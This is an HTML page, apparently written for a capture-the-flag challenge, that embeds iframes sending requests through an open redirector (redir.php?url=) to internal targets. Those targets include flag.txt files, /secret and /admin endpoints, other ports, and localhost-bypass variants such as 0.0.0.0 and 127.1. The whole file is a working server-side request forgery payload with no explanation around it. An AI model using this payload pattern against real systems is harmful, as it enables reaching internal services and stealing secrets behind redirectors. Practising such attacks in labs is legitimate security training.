<!DOCTYPE html>
<html>
<head>
    <title>Quick High-Value Targets</title>
</head>
<body>
    <h1>High-Value Targets</h1>
    
    <!-- Most likely flag locations -->
    <h3>Flag Files via HTTP</h3>
    <iframe src="http://localhost/redir.php?url=http://localhost/flag.txt" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=http://127.0.0.1/flag.txt" width="100%" height="150"></iframe>
    
    <!-- Try accessing redirector with different methods -->
    <h3>Direct Redirector Access</h3>
    <iframe src="http://localhost/redir.php?url=http://localhost:8080/flag.txt" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=http://127.0.0.1:9000/" width="100%" height="200"></iframe>
    
    <!-- Try the application's own endpoints -->
    <h3>Application Endpoints</h3>
    <iframe src="http://localhost/redir.php?url=http://localhost/secret" width="100%" height="150"></iframe>
    <iframe src="http://localhost/redir.php?url=http://localhost/admin" width="100%" height="200"></iframe>
    
    <!-- Try localhost variations -->
    <h3>Localhost Variations</h3>
    <iframe src="http://localhost/redir.php?url=http://0.0.0.0:80/" width="100%" height="200"></iframe>
    <iframe src="http://localhost/redir.php?url=http://127.1:80/" width="100%" height="200"></iframe>
</body>
</html>
